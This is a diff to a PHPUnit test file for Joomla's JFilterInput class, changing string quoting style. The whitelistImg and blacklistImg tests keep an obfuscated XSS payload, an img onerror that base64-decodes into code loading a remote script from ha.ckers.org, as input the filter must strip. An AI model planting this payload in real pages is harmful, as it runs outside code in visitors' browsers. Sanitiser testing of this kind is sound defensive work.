@@ -520,8 +520,8 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 			),
 			'unknown_03' => array(
 				'',
-				array("key" => "Value", "key2" => "This&That", "key2" => "This&amp;That"),
-				array("key" => "Value", "key2" => "This&That", "key2" => "This&That"),
+				array('key' => 'Value', 'key2' => 'This&That', 'key2' => 'This&amp;That'),
+				array('key' => 'Value', 'key2' => 'This&That', 'key2' => 'This&That'),
 				'From generic cases'
 			),
 			'unknown_04' => array(
@@ -788,8 +788,8 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	public function whitelistImg()
 	{
 		$security20110329bString = "<img src='<img src='/onerror=eval" .
-			"(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J" .
-			"jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ";
+			'(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J' .
+			'jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//\'/> ';
 
 		$casesSpecific = array(
 			'Kill script' => array(
@@ -1371,9 +1371,9 @@ class JFilterInputTest extends PHPUnit_Framework_TestCase
 	public function blacklistImg()
 	{
 		$security20110328String = "<img src='<img src='/onerror=" .
-			"eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV" .
-			"tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=" .
-			"/.source))//'/> ";
+			'eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV' .
+			'tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=' .
+			'/.source))//\'/> ';
 
 		$casesSpecific = array(
 			'Kill script' => array(
